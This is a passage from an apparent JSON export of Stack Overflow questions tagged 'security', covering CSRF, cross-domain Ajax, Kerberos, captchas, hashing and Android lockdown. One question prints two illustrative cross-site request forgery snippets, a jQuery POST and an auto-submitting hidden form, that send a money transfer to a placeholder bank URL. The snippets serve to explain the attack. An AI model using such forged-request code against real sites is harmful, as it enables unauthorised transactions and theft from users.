site.</p>\n"},{"tags":["javascript","ios","security","uiwebview","webview"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12857875,"title":"Security restrictions when calling Javascript within a iOS UIWebView?","body":"<p>I'm researching the viability of an iOS app that will open up multiple UIWebViews in the background and log into multiple websites based on userdata data entered into the original app.\nThe main app will be driving the hidden webviews by executing Javascript to obtain(scrape) data from the pages for cost comparison and then executing actions if desired.\nThe website are using https.</p>\n\n<p>Are there any security restrictions or other problems related to this I need to be aware of? </p>\n\n<p>Thanks</p>\n\n<p>J</p>\n"},{"tags":["php","javascript","security",".htaccess","captcha"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12770875,"title":"Create a unreadable PHP page for capthca","body":"<p>I'm using the cool-captcha for my registration form. \nThis is the Captcha generated picture code which I'm using inside my codes:</p>\n\n<pre><code>&lt;img src=\"captcha.php\" id=\"captcha\" /&gt;\n</code></pre>\n\n<p>Anyone can directly go to \"captcha.php\" page and view the image. So my question is, is there anyway to disable the direct access or direct viewing of Captcha.php in browser ? I just want the Captcha.php can only be used to view inside the img source not in direct viewing by browsers. Is there anyway to do in php or htaccess file ?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","copy","drm","piracy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":179,"score":0,"question_id":2325507,"title":"Which copy protection techniques are available for digital material?","body":"<p>Suppose a website offers the following resources for premium users:</p>\n\n<ul>\n<li>PDF Files</li>\n<li>Video Files</li>\n<li>Presentations (e.g. .ppt files)</li>\n</ul>\n\n<p>Which protection techniques are available to prevent (slow down) the user to copy and re-distribute these resources?</p>\n"},{"tags":["php","wordpress","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":11232473,"title":"wordpress secure client portal","body":"<p>Basically I have a new client that is after the following functionality from her accountancy website:</p>\n\n<ul>\n<li>A client area in which here existing clients can log into. </li>\n<li>a place within the log in are where clients can access documents\nsuch as tax    returns etc.</li>\n</ul>\n\n<p>naturally this all needs to be very secure. My question is:</p>\n\n<p>Is there a Wordpress plugin that can achieve this or is their an open source php framework out there that allows me to do this. </p>\n\n<p>I could go through the process myself using php and mysql PDO but apart from encrypting the passwords i am not confident that the security i could program would be adequate. Any recommendations?</p>\n"},{"tags":["security","application","architecture"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":27,"score":0,"question_id":12811061,"title":"How to design a application security architecture across multiple technology stack","body":"<p>Due to acquisition, we have lot of modules using different technology. We are considering a way to centralize application security controls implementation. Two solutions in my mind but both seems have some flaws:\nOption1\nCreate a independent security library. The weakness is it cannot be used for different language. We will need at least provide interface for different language.</p>\n\n<p>Option2\nCreate a security service using REST API. Then, any technology can use it. But it introduce extra performance overhead.</p>\n\n<p>Do you have any experience on this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12857688,"title":"SQL Server Schema Security","body":"<p>I have a user U in a database where I want it to be able to create types and stored procs in a specified schema say UserSchema but not be able to alter schema dbo. So I created the schema and also applied the following grant statement to it:</p>\n\n<pre><code>GRANT  ALTER, Execute ON SCHEMA ::UserSchema to [U];\n</code></pre>\n\n<p>When I login as user U and I try create a type in UserSchema it fails with a permissions failure...</p>\n\n<p>Any Ideas?</p>\n"},{"tags":["security","cookies","ssl","https","facebook-javascript-sdk"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12698846,"title":"What's the best way to support Facebook login in a secure way and avoiding eavesdropping from a malicious user?","body":"<p>Facebook has done great work on preventing eavesdropping (with tools like Firesheep) by supporting https on all facebook.com pages, but does not provide similar levels of security for 3rd party sites.</p>\n\n<p>Right now it's possible to eavesdrop the traffic from a 3rd party website which is using the Facebook JS SDK and get a user's signed fbsr_APP_ID cookie which a website should use to authenticate their users.</p>\n\n<p><strong>Is there a way to set this cookie with the <em>secure</em> parameter so that it's only transmitted over HTTPS connections?</strong></p>\n\n<p>I have read both the documentation and the JavaScript SDK source code and it doesn't seem possible. <strong>So if it's not possible, which other authentication method would you suggest to avoid eavesdropping of this cookie?</strong></p>\n"},{"tags":["security","java-ee","servlets"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12876065,"title":"OpenID in JEE6 application - how to get Principal object for user","body":"<p>I'm playing with OpenID authentication in my app for the first time. \nI can successfully authenticate user against choosen provider, but I don't know how to correctly login user on JEE server, so that it looks like user was logged in with e.g. form-based login. I could use Servlet 3.0 <code>login</code> but it takes username/password pair and I don't have passwords when using OpenID. </p>\n\n<p>I'd like to be able to get <code>Principal</code> object and use <code>isUserInRole</code> method etc. Am I missing something? I'm running this app on JBoss 7.1, but I suppose there should be a common way to do that. Or maybe I'm missing something and all that stuff with <code>Principal</code> and user roles is done differently when using OpenID?</p>\n"},{"tags":["flex","security","crossdomain.xml"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":19710,"score":4,"question_id":101427,"title":"Flex and crossdomain.xml","body":"<p>I was wondering are there any security concerns with adding crossdomain.xml to the root of an application server? Can it be added to any other parts of the server and are you aware of any work arounds that dont require the server to have this file in place?</p>\n\n<p>Thanks\nDamien</p>\n"},{"tags":["php","security","url","parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12873996,"title":"How to improve security with text in a url parameter : .php?parameter=text","body":"<p>This url contains a parameter with text :</p>\n\n<blockquote>\n  <p>my-page.php ?id_article=1&amp;alias=article-name</p>\n</blockquote>\n\n<p>The result after rewritting is :</p>\n\n<blockquote>\n  <p>1-article-name.php</p>\n</blockquote>\n\n<p>For id_article parameter, i made this security :</p>\n\n<pre><code>if (isset($_GET[id_article] &amp;&amp; $_GET[article] != null &amp;&amp; $_GET[id_article] &gt;= 1 &amp;&amp; $_GET[id_article] &lt;= 4 &amp;&amp; (int) $_GET[id_article])\n</code></pre>\n\n<p>What can i do for alias parameter which accept text ?</p>\n"},{"tags":["mysql","sql","security","phpmyadmin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12873362,"title":"Error in updating mysql database","body":"<pre><code>UPDATE \n  `code_library_questions` \nSET \n  `answer` = 'value' \nWHERE \n  `sn` = 2;\n</code></pre>\n\n<p>Its working fine when value is some text. But whenever value include some codes of C or C++, it gives following error message </p>\n\n<blockquote>\n  <p>You don't have permission to access /phpmyadmin/tbl_replace.php on this server.</p>\n</blockquote>\n\n<p>why it is happening???</p>\n"},{"tags":["web-services","security","internet-explorer"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4604,"score":7,"question_id":1890565,"title":"How to suppress \"This page is accessing information not under its control\"","body":"<p>I get this message when I am trying to access a web service from Jquery located in SAME the URL (but different directory). </p>\n\n<p>I know it is IE security setting. The question is, how do I suppress it...surely, people don't put web services in the same web site, same directory....</p>\n"},{"tags":["security","https","game-engine","cocos2d-x"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12872772,"title":"HTTPS on Cocos2d-x","body":"<p>I'm implementing a game app based on cocos2d-x. In order to technically prevent cheating, one of the ideas to do is using HTTPS for all the client-server communication, which make it difficult to get the data format / game logic and send modified request to cheat. (I know \"prevent\" is actually impossible but for increasing the cost of making game cheating it's ok : ). My question is,</p>\n\n<ol>\n<li>In Cocos2d-x, how to make HTTPS request? Possible?</li>\n<li>In a more general case, technically what to do to reduce such game hacking? What strategy to hold? </li>\n</ol>\n"},{"tags":["facebook","security","blocking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":50,"score":-5,"question_id":12872669,"title":"Android : Block Facebook Apps & iWebsite","body":"<p>I want block Facebook website &amp; its App in My Android Tablet,</p>\n\n<p>So Any Software or Setting is there?</p>\n"},{"tags":["facebook","security","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12857337,"title":"Is fb_ca_chain_bundle.crt dangerous","body":"<p>I am using Facebook PHP API and I need to have the file fb_ca_chain_bundle.crt on my server. Is it dangerous if this file is visible from the web and what can someone do with it if he finds it (supopsing he does not have the API secret)?</p>\n\n<p>I can't edit the .htaccess file, so my only option is to hide the facebook library somewhere in the directory tree.</p>\n"},{"tags":["php","security","function","md5"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":86,"score":3,"question_id":12870468,"title":"Using this custom hashing function, is there any obvious security flaws I am missing?","body":"<pre><code>&lt;?php\nfunction md7($text, $len)\n{\n  if($text)\n  {\n   $split = str_split(md5($text).md5(strlen($text)).md5($len), 5);\n    foreach($split as $key=&gt;$value)\n    {\n      $md5 = $md5.md5($value);\n    }\n    $split2 = str_split($md5);\n    foreach($split2 as $kl=&gt;$vl)\n    {\n      if($kl &lt; $len)\n      {\n        $digest = $digest.$split2[$kl];\n      }   \n    }\n    return $digest;\n  }\n} // end md7 function\n?&gt;\n</code></pre>\n\n<p>I created this function to make use of md5 and a variable length hash, I believe this reduces the chances of a collision, I have tested the examples of an MD5 collision and it does not create a collision for this function, and this function I believe is not susceptible to rainbow table attacks.</p>\n"},{"tags":["asp.net","security","iis","sharepoint2010"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":282,"score":1,"question_id":10726477,"title":"ASP.NET application gets system.unauthorizedaccessexception when accessing a network drive","body":"<p>I'm attempting to access a network drive from an ASP.NET page. Technically it's a SharePoint application page (_layouts/mycompany/mypage.aspx) but I believe the principles are the same.</p>\n\n<pre><code>string filePath = @\"\\\\companyshare\\temp\\test.txt\";\nFileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read);\n</code></pre>\n\n<p>When I hit the second line in the code above I get the error:</p>\n\n<blockquote>\n  <p>Access to the path '\\companyshare\\temp\\test.txt' is denied.</p>\n</blockquote>\n\n<p>The application pool for this site is running under a domain account (MYCOMPANY\\adminacct). MYCOMPANY\\adminacct has access to the file \\companyshare\\temp\\test.txt. I've confirmed that by logging into the server with the MYCOMPANY\\adminacct credentials and navigating to the file using the same path that is in the code.</p>\n\n<p>I'm running IIS 7.5</p>\n\n<p><strong>Questions</strong></p>\n\n<p>How come the above code is still getting access denied even though the application pool account has access to the folder and file?</p>\n\n<p>Is there a way to confirm that my code is actually trying to access that file with the credentials I believe it is using?</p>\n"},{"tags":["html","database","security","escaping"],"answer_count":4,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":645,"score":8,"question_id":3648430,"title":"Is it a bad idea to escape HTML before inserting into a database instead of upon output?","body":"<p>I've been working on a system which doesn't allow HTML formatting. The method I currently use is to escape HTML entities before they get inserted into the database. I've been told that I should insert the raw text into the database, and escape HTML entities on output.</p>\n\n<p>Other similar questions here I've seen look like for cases where HTML can still be used for formatting, so I'm asking for a case where HTML wouldn't be used at all.</p>\n"},{"tags":["ajax","security","xss"],"answer_count":9,"favorite_count":12,"up_vote_count":26,"down_vote_count":3,"view_count":3739,"score":23,"question_id":466737,"title":"Why the cross-domain Ajax is a security concern?","body":"<p>Why was it decided that using <strong>XMLHTTPRequest</strong> for doing XML calls should not do calls across the domain boundary?  You can retrieve JavaScript, images, CSS, iframes, and just about any other content I can think of from other domains. Why are the Ajax HTTP requests not allowed to cross the domain boundaries?  It seems like an odd limitation to put, considering the only way I could see it being abused, would be if someone were to inject Javascript into the page.  However, in this case, you could simply add an img, script, or iframe element to the document to get it to request the third party URL and send it to the server.  </p>\n\n<p>[Edit] </p>\n\n<p>Some of the answers point out the following reasons, let's point out the reasons they don't  create a major reason to disallow this.</p>\n\n<h2>XSRF (Cross Site Request Forgery, also known as CSRF, XSRF)</h2>\n\n<p>Your can do XSRF attacks without using this at all.  As a general rule, XMLHTTPRequest isn't used at all, simply because it's so hard to make an XMLHTTPRequest in a way that's compatible with all major browsers.  It's much easier to just add an img tag to the URL if you want them to load your URL.</p>\n\n<h2>Posting to third party site</h2>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  $.post(\"http://some-bank.com/transfer-money.php\", \n         { amount: \"10000\", to_account: \"xxxx\" })\n&lt;/script&gt;\n</code></pre>\n\n<p>Could be accomplished with</p>\n\n<pre><code>&lt;body onload=\"document.getElementById('InvisbleForm').submit()\"\n    &lt;div style=\"display:none\"&gt;\n        &lt;form id=\"InvisbleForm\" action=\"http://some-bank.com/transfer-money.php\" method=\"POST\"&gt;\n            &lt;input type=\"hidden\" name=\"amount\" value=\"10000\"&gt;\n            &lt;input type=\"hidden\" name=\"to_account\" value=\"xxxxx\"&gt;\n        &lt;/form&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre>\n\n<h2>JPunyon: why would you leave the vulnerability in a new feature</h2>\n\n<p>You aren't creating any more insecurities.  You are just inconveniencing developers who want to use it in a way for good.  Anybody who wants to use this feature for evil (aka awesome) could just use some other method of doing it.</p>\n\n<h2>Conclusion</h2>\n\n<p>I'm marking the answer from <strong>bobince</strong> as correct because he pointed out the critical problem.  Because XMLHTTPRequest allows you to post, with credentials (cookies) to the destination site, and read the data sent back from the site, along with sending the persons credentials, you could orchestrate some javascript that would submit a series of forms, including confirmation forms, complete with any random keys generated that were put in place to try to prevent a XSRF.  In this way, you could browse through the target site, like a bank, and the bank's webserver would be unable to tell that it wasn't just a regular user submitting all these forms.</p>\n"},{"tags":["html","security","iis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":12869596,"title":"Security for Account Information on Website","body":"<p>I'm completely new to this and am kind of being shoved into doing a website which does not process any transactions itself, but it does send personal information from client to a server database.</p>\n\n<p>The user will be entering their credit card # and exp. date into our database. <strong>What type of security should I be looking at on the server side? Client side?</strong> What is the complexity of implementing these security measures?</p>\n\n<p>I'm not new to websites, just to security on websites. Any help to get me started is much appreciated.</p>\n"},{"tags":["security","cpanel","remote-file-inclusion"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":12867769,"title":"Tracing footprints on a hacked server","body":"<p>My server got hacked yesterday and I found a file name <strong>772e.php</strong> in my server. It seems someone remotely included file into my server. I searched all my access logs and did not found any trace of how this file got there. </p>\n\n<p>Any suggestions on how can I found that someone placed this file on my server and stop it from happening again. </p>\n\n<p>Main scripts on my server are wordpress, phpbb and some custom scripts.</p>\n"},{"tags":["security","sharepoint","kerberos","anonymous","spn"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12700978,"title":"kerberos anonymous logon","body":"<p>I'm trying to implement Kerberos authentication on Java to use Sharepoint 2010.<br>\nAlready made tons of configuration: SPN's, delegations, permissions, network.\nUsing org.ietf.jgss implementation of Kerberos.</p>\n\n<p>Current state is the following: IE works fine, Java app works incorrectly.</p>\n\n<p>Almost the only difference I have now is in Event Viewer\\Windows Logs\\Security.<br>\nIf I log in with Internet Explorer, it shows:</p>\n\n<blockquote>\nAn account was successfully logged on.<br/>\n    ...<br/>\n    New Logon:<br/>\n    Security ID:    COMPANYDOMAIN\\myusername<br/>\n    Account Name:       myusername<br/>\n    Account Domain:     COMPANYDOMAIN<br/>\n...<br/>\nDetailed Authentication Information:<br/>\n    Logon Process:      Kerberos<br/>\n<br/></blockquote>\n\n<p>Login with my JavaApp:</p>\n\n<blockquote>\nAn account was successfully logged on.<br/>\n    ...<br/>\n    New Logon:<br/>\n    Security ID:    ANONYMOUS LOGON<i>  ------> ???</i><br/>\n    Account Name:       myusername<br/>\n    Account Domain:     COMPANYDOMAIN.NET <i>  ------> .NET(!)</i><br/> \n...<br/>\nDetailed Authentication Information:<br/>\n    Logon Process:      Kerberos<br/>\n<br/></blockquote>\n\n<p>Using Wireshark I can see that ticket was accepted successfully at the endpoint, no difference except the size of encrypted token, even more - SharePoint does work with my java client. The question why is it working under anonymous login is different, I should switch it off somewhere. <br><br>\nThe main question is why Security ID is \"ANONYMOUS LOGON\" while the account name and domain are valid? Delegation\\Impersonation problems? But IE is working fine from the machine that is even out of Active Directory.</p>\n\n<p>I can provide additional info if needed: network traffic, SPN's, app pools, permissions, AD configuration.</p>\n\n<p>===========================</p>\n\n<p>SOLVED:\nThe problem is solved by unchecking checkbox \"Do not require Kerberos pre-authentication\" in Active Directory user account properties (tab Account, section Account options).</p>\n"},{"tags":["asp.net-mvc","security","iis","asp.net-mvc-routing","rules"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12855050,"title":"IIS .NET Authorization Rules or MVC Route rules?","body":"<p>I want to restrict access to a folder, not a page, so I thought the best approach would be using the IIS Remote Manager and add a .NET Authorization Rules entry to deny All Users to the folder in question.  </p>\n\n<p>The next step is to add authorization for Users who may be in a certain role (I'm guessing this applies to Users logged into an MVC Site, but I don't know yet).  </p>\n\n<p>In testing the first step what I discovered was the MVC 3 Application directs the visitor to a logon page.</p>\n\n<p>The first challenge I ran into, still looking to resolve.</p>\n\n<p>The original subdomain format:</p>\n\n<pre><code>subdomain1.site.com\n</code></pre>\n\n<p>The locked down folder is \"images\", but the path to the locked down folder:</p>\n\n<pre><code>subdomain1.site.com/content/images\n</code></pre>\n\n<p>When you try to access an image in the locked down folder, you get redirected to:</p>\n\n<pre><code>subdomain1.site.com/subdomain1/Account/LogOn...\n</code></pre>\n\n<p>I would expect this to be:</p>\n\n<pre><code>subdomain1.site.com/Account/LogOn...\n</code></pre>\n\n<p>I have another question posted regarding <a href=\"http://stackoverflow.com/questions/12854705/iis-7-url-rewrite-config-issue-or-mvc-route\">URL Rewrite...</a> here on StackOverFlow, not sure what the correct solution should be so I separated these questions.</p>\n\n<p>I know you can restricted a page based on logged in Users and Roles, but that only applies to the page and not files that may exist in a folder.</p>\n\n<p>My thought on this is to deny all access to the folder and then add in rules for authorized roles.  If Security works the way I think it does then when a User logs into the MVC 3 Site, they will have credentials with the assigned Roles.</p>\n\n<p>In this capacity, it should then allow them to access any restricted files in the locked down folder as long as the same Roles are mapped in the rules.</p>\n"},{"tags":["php","mysql","security","checklist"],"answer_count":5,"favorite_count":6,"up_vote_count":4,"down_vote_count":0,"view_count":1119,"score":4,"question_id":3714107,"title":"PHP/MySQL Security Checklist: The definitive practical guide","body":"<h2>This question and its answers are now out of date</h2>\n\n<p>See <a href=\"http://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection-in-php\">this question instead</a></p>\n\n<p>Please, don't use <code>mysql_*</code> functions to write new code. They are no longer maintained and the community has begun the <a href=\"http://goo.gl/KJveJ\" rel=\"nofollow\">deprecation process</a>. See the <em><a href=\"http://goo.gl/GPmFd\" rel=\"nofollow\">red box</a></em>? Instead you should learn about <a href=\"http://goo.gl/vn8zQ\" rel=\"nofollow\">prepared statements</a> and use either <a href=\"http://php.net/pdo\" rel=\"nofollow\">PDO</a> or <a href=\"http://php.net/mysqli\" rel=\"nofollow\">MySQLi</a>. If you can't decide which, <a href=\"http://goo.gl/3gqF9\" rel=\"nofollow\">this article</a> will help you. If you pick PDO, <a href=\"http://goo.gl/vFWnC\" rel=\"nofollow\">here is good tutorial</a>. Also see <a href=\"http://goo.gl/ycnmO\" rel=\"nofollow\">Why shouldn't I use <code>mysql</code> functions in PHP?</a></p>\n\n<hr>\n\n<p>After seeing <a href=\"http://stackoverflow.com/questions/315911/git-for-beginners-the-definitive-practical-guide\">this awesome guide on Stack</a> and needing a practical <code>PHP/MySQL</code> security checklist in-house, I have decided to pay homage to the original guide.</p>\n\n<p>What I need is a <strong>practical</strong> security checklist for <code>PHP</code> and <code>MySQL</code>. The contents here can function as the checklist, while the answers should function as the guides.</p>\n\n<p>By <em>practical</em> I mean that each answer should avoid superfluous security theoretics and focus on real results. Most of us don't need to know about <code>RFC3174</code> when you're suggesting to secure passwords using a <code>SHA-1</code> hash. We just want to make passwords secure.</p>\n\n<p>I will go through the entries from time to time and tidy them up so they have a consistent look and feel and it's easy to scan the list. Feel free to follow a simple \"header - brief explanation - list of instructions - gotchas and extra info\" template. I'll also link to the entries from the bullet list below so it's easy to find them later.</p>\n\n<p><strong>Procedural note</strong>: PLEASE pick <strong>one and only one</strong> of the below topics and answer it clearly and concisely. Don't try to jam a bunch of information into one answer. Don't just link to other resources - cut and paste with attribution if copyright allows, otherwise learn it and explain it in your own words (that is, don't make people leave this page to learn a task). Please comment on, or edit, an already existing answer unless your explanation is very different and you think the community is better served with a different explanation.</p>\n\n<h1>PHP</h1>\n\n<hr>\n\n<p>Validate user input<br/>\nGuard your file system<br />\nGuard your sessions<br />\nGuard against XSS vulnerabilities<br />\nGuard against invalid <code>POST</code>s<br />\nGuard against CRSF<br />\n<a href=\"http://stackoverflow.com/questions/3714107/php-mysql-security-checklist-the-definitive-practical-guide/3714225#3714225\">Stop using <code>$_REQUEST</code></a><br />\nStop using <code>register_globals</code></p>\n\n<p><br /></p>\n\n<h1>MySQL</h1>\n\n<hr>\n\n<h2>Avoid SQL injection</h2>\n\n<p><a href=\"http://stackoverflow.com/questions/3714107/php-mysql-security-checklist-the-definitive-practical-guide/3714241#3714241\">Use <code>mysql_real_escape_string</code> to protect against <code>SQL</code> injection</a></p>\n\n<p><br />\n<strong>Keep in mind that the above list is only a starter</strong>, and that many of the above topics will likely become sub-headers and are too broad to write on. Try to distill something smaller like \"Stop using <code>register_globals</code>\" rather than, say, trying to write an answer on XSS as a whole. Over time I hope everyone can add many more things.</p>\n"},{"tags":["database","security","encryption","couchdb"],"answer_count":7,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":734,"score":7,"question_id":4961603,"title":"What's the best way to store and yet still index encrypted customer data?","body":"<p>What's the best way to store and yet still index encrypted customer\ndata?</p>\n\n<p>I'm building an application that needs to store sensitive information,\nbut it still needs to be searchable on a certain level. But ideally it should also be encrypted, so that a hacker who gets into the server can't read it.</p>\n\n<p>What are some best practices and approaches for storing sensitive data that needs to be searchable?\nThis data can't be as opaque as a password hash. It needs to be\nviewable, sortable, and searchable by authorized people.</p>\n\n<p>The data may be stored in a relational database or a document store like\nCouchDB.</p>\n\n<p>I'm perfectly willing to make certain compromises. For example, I'm willing to leave some data attributes unencrypted to make them indexable, but keep the main body of stuff like emails stored as encrypted blobs. Also, I was thinking of extracting non-stop-words from the body of emails and putting them in random order in a field before encrypting the body, and then feed that field to a search indexer, although I'm not sure whether this provides any real degree of security.</p>\n\n<p>Thanks for any wisdom or suggestions you guys can offer.</p>\n\n<p>If what I'm wishing for is impractical and I should just concentrate on securing the server, let me know.</p>\n"},{"tags":["linux","security","find","owasp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12867070,"title":"Linux text editor temp files search","body":"<p>I remember reading where it is bad security practice to edit files directly on the server because it may create hidden temporary files. Is it possible to search for these files? I was thinking of find / -name .*, but that returns \"paths must precede expression: ..\" and do not know if that will include all files possibly created by elvis or nano.</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12865429,"title":"How specify platform independent paths in java.security and policy files?","body":"<p>I want to ship a single security policy file to our customers - for both Linux and Windows. In the java.security file, I add a line to point to our file, but due to path differences I have to specify it differently for Windows and Linux</p>\n\n<pre><code>policy.url.3=file:/${our.home}/lib/OurSecurity.policy  # Windows\npolicy.url.3=file:${our.home}/lib/OurSecurity.policy   # Linux\n</code></pre>\n\n<p>That first \"/\" after the \"file:\" is needed on windows since the variable our.home is defined as \"C:\\foo\".  I have the same problem in the policy file itself:</p>\n\n<pre><code>grant codeBase \"file:/${our.home}/-\"   // Windows\ngrant codeBase \"file:${our.home}/-\"    // Linux\n</code></pre>\n\n<p>I'm especially looking for a clever way to specify the codeBase in a platform independent way.  By the way, redefining our.home is not really an option, as it's needed in a FilePermission clause.</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":412,"score":3,"question_id":9130599,"title":"How to change the snapshot shown by recent apps list?","body":"<p>In the newer versions of Android (> 3.0) there is an onscreen button that \nwill display a list of the recent apps with their names and snapshots. \nEven though my app itself is password protected, this overview might \nshow sensitive data in that snapshot. So is there any way to force a \ncertain image (like a logo) to be shown rather than let the OS decide? </p>\n"},{"tags":["java","android","security","logging","android-activity"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":286,"score":0,"question_id":4901261,"title":"Use Call Activity without logging in recent calls","body":"<p>I have an application that uses call activity to call people. However, when the call is made, the number will be logged to recent call list, and I don't want this to happen. </p>\n\n<p>What would be the best way for the phone to not to log the calls made?</p>\n"},{"tags":["java","android","security","android-manifest"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":413,"score":1,"question_id":11120176,"title":"Handle Recent apps click and home press in android","body":"<p>I am making an app for kids where once you're inside the app you can't exit without password which I am asking for in the menu. Now I want if inside app I press home button in the app it should remain on same activity.  I searched a lot but everywhere the solution is adding filters in manifest but those are not working well for me. I want my activity to be removed from launcher when app exits and again ask if starts application.</p>\n\n<p>And for the same app if i press recent app button and one of those is clicked by the kid also the app should be in same activity or if there any way to block the recent app button.</p>\n\n<p>I tried this</p>\n\n<pre><code>&lt;activity\n    android:label=\"@string/app_name\"\n    android:launchMode=\"singleInstance\"\n    android:name=\".MyActivity\"\n    android:screenOrientation=\"landscape\"\n    android:excludeFromRecents=\"true\"\n    android:taskAffinity=\"\"\n    android:stateNotNeeded=\"true\" &gt;\n    &lt;intent-filter &gt;\n        &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n         &lt;category android:name=\"android.intent.category.HOME\" /&gt;\n         &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre>\n"},{"tags":["security","session","e-commerce","bots"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12587513,"title":"Why shouldn't bots be allowed session ids?","body":"<p>I am trying to write a script that will let me identify bots that are trying to flood my oscommerce site, but some bots change their IPs frequently so I cant really use the IP to ban them. </p>\n\n<p>I was thinking may be if I enable sessions for bots, I could use the session IDs to block the bot. </p>\n\n<p>I did some research on this and found that enabling sessions for bots is not recommended but I am still not sure why? </p>\n"},{"tags":["security","ibm-midrange","profile-token"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12830341,"title":"How can I double check my use of Profile Tokens on the IBM iSeries?","body":"<p>I am using the IBM security APIs (QSYGENPT, QSYRMVPT, etc) to create profile tokens on an iSeries system when users authenticate in order to start jobs as the user.  There is a fixed limit of 2,000,000 such tokens that can be created on the system, so one needs be careful to delete any token created when it's no longer needed.  Failing to do so would constitute a leak of a critical system resource.</p>\n\n<p>However, I can find no way on the system to report a current total count of the tokens, list tokens created by a particular job and/or user, or anything like that, so I have no way of validating that my program is not leaking tokens.</p>\n\n<p>So far, the only way seems to be to use the system's audit journal entries and tediously match up token create/delete audit entries.  Ugh!  </p>\n\n<p>Can anyone offer any better ideas?</p>\n"},{"tags":["javascript","jquery","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12864537,"title":"Javascript Security Concern","body":"<p>In my previous question: \n<a href=\"http://stackoverflow.com/questions/12861419/securing-javascript-game-timing\">Securing javascript game timing</a></p>\n\n<p>... it became clear that client-side timing in a Javascript/Canvas game simply won't be secure. I know the mantra about not trusting the client - that is what is causing my struggle in the first place. :-)</p>\n\n<p>So, if I do move all timing to the server and just deal with it, here is a follow-up question. The game obviously needs to be completed before submitting it. As the game puzzle is all Javascript, this introduces the problem of manipulating the client-side code to fake the completion of the game.</p>\n\n<p>I've created the game JS code in a separate class file. If I instantiate the game as such:</p>\n\n<pre><code>var game;\n$document.ready(function(){\n  game = new Game();\n});\n</code></pre>\n\n<p>... then, I can access the 'game' object and all of its methods and variables via the console. </p>\n\n<p>However, if I do:</p>\n\n<pre><code>$document.ready(function(){\n  var game = new Game();\n});\n</code></pre>\n\n<p>... then I cannot access the 'game' object through the console. This seems to help, but is there something I don't know - can this object still be accessed in some way I don't know about or is making it a private var in that function a little more secure?</p>\n\n<p>Thanks!</p>\n"},{"tags":["javascript","security","node.js","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":693,"score":1,"question_id":8610222,"title":"How to prevent DOS attacks on my http server which written in node.js?","body":"<p>using node.js, the net module for building a tcp server which can hande http requests.</p>\n\n<p>I would like to prevent dos attacks so what I have done is somthing like this:</p>\n\n<pre><code>if (status.numOfCurrentRequests + 1 &gt;= MAX_NUM_OF_CONNECTIONS) {\n    socket.end();\n    return; \n}\n</code></pre>\n\n<p>I was wondering if it is better to use :</p>\n\n<pre><code>socket.destroy();\n</code></pre>\n\n<p>from the API :</p>\n\n<blockquote>\n  <p>socket.destroy() # Ensures that no more I/O activity happens on this\n  socket. Only necessary in case of errors (parse error or so).</p>\n</blockquote>\n\n<p>what are the differences and benefits? </p>\n"},{"tags":["security","application","player","soundcloud","locked"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12863990,"title":"Soundcloud track embedded player in app","body":"<p>Is there a way to lock an embedded player for APP thru the API that is limited 